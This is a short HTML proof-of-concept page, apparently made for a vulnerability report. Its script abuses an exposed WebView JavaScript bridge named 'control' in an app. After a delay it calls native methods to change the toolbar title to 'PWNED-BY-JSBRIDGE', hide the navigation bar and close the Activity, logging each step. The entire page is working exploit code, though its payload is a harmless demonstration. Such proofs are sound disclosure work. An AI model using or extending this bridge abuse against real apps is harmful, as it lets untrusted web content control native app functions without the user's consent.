<!DOCTYPE html><html><head><title>PoC v12 exec proof</title></head>
<body>
<h2>PoC v12 exec proof</h2>
<pre id="out">waiting 3s...</pre>
<script>
function log(s){document.getElementById('out').textContent += "\n" + s;}
setTimeout(function(){
  if (!window.control) { log("NO control"); return; }
  log("calling metaTitle (changes toolbar title)");
  try { control.metaTitle("PWNED-BY-JSBRIDGE"); log("metaTitle OK"); } catch(e){ log("ERR metaTitle "+e); }
  log("calling setNavigationBarHide...");
  try { control.setNavigationBarHide("1"); log("snbh OK"); } catch(e){ log("ERR snbh "+e); }
  log("now closing this Activity via navigationPopBack in 2s");
  setTimeout(function(){ try { control.navigationPopBack(); log("npb OK"); } catch(e){ log("ERR npb "+e); } }, 2000);
}, 3000);
</script>
</body></html>
